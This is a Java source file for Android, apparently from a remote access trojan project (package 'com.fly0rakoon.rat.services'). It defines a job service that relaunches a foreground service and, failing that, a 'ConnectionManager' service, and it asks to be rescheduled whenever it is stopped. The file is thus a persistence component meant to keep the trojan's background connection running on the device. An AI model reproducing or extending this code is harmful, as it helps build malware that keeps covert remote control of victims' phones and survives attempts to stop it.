package com.fly0rakoon.rat.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class JobSchedulerService extends JobService {
    private static final String TAG = "JobSchedulerService";

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "Job started, launching ForegroundService");
        
        try {
            Intent serviceIntent = new Intent(this, ForegroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "Service started successfully from job");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start service from job: " + e.getMessage());
            
            // Try alternative method
            try {
                Intent altIntent = new Intent(this, ConnectionManager.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(altIntent);
                } else {
                    startService(altIntent);
                }
            } catch (Exception ex) {
                Log.e(TAG, "Alternative start also failed: " + ex.getMessage());
            }
        }
        
        return false; // Work completed
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(TAG, "Job stopped, will reschedule");
        return true; // Reschedule if stopped
    }
}
